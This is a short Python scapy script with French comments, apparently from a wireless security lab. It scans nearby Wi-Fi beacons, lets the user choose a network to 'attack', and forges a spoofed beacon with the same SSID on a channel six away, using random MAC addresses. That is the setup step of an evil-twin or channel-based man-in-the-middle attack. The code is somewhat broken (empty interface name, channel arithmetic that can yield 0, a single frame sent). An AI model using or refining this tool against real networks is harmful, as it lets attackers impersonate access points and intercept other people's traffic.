from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt

ifname = ''
network_list = []

# Fonction pour extraire les informations des trames Beacon
def getNetwork(packet):
    if packet.haslayer(Dot11Beacon):
        # Extraire les informations SSID, canal et puissance
        ssid = packet[Dot11Elt].info.decode()
        channel = int(ord(packet[Dot11Elt:3].info))
        power = packet.dBm_AntSignal
        # Ajouter les informations à la liste des réseaux
        network_list.append((ssid, channel, power))
        
# Génère un beacon concurrent annonçant un réseau sur un canal différent se trouvant à 6 canaux de séparation du réseau original
def concurrent_beacon(ssid, channel, ifname):
    channel = (channel + 6) % 14
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=RandMAC())
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    channel = Dot11Elt(ID="DSset", info=chr(channel))
    return RadioTap()/dot11/beacon/essid/channel


# Scanne des réseaux à proximité
print("Scanning nearby Wi-Fi networks...")
sniff(iface=ifname, prn=getNetwork, timeout=10)

# Affiche les informations des réseaux découverts
print("\nList of nearby Wi-Fi networks:")
print("{:<3} {:<20} {:<10} {:<10}".format("#", "SSID", "Channel", "Power"))
for i, network in enumerate(network_list):
    ssid, channel, power = network
    print("{:<3} {:<20} {:<10} {:<10}".format(i+1, ssid, channel, power))

# Demande à l'utilisateur de choisir un réseau
choice = input("\nChoose a network (enter number): ")
choice = int(choice)

# Vérifie si le choix de l'utilisateur est valide
if choice < 1 or choice > len(network_list):
    print("Invalid choice. Exiting...")
    exit()

# Extrait les informations du réseau choisi
ssid, channel, power = network_list[choice-1]

# Validation du choix par l'utilisateur
print("\nVoulez vous attaquer ce réseau ?")
print("SSID: ", ssid)
print("Channel: ", channel)
print("Power: ", power)

validation = input("[Y/n]: ")

if validation != "Y" and validation != "y":
    print("The attack has been canceled. Exiting...")
    exit()

frame = concurrent_beacon(ssid, channel, ifname)
sendp(frame, iface=ifname, verbose=False)
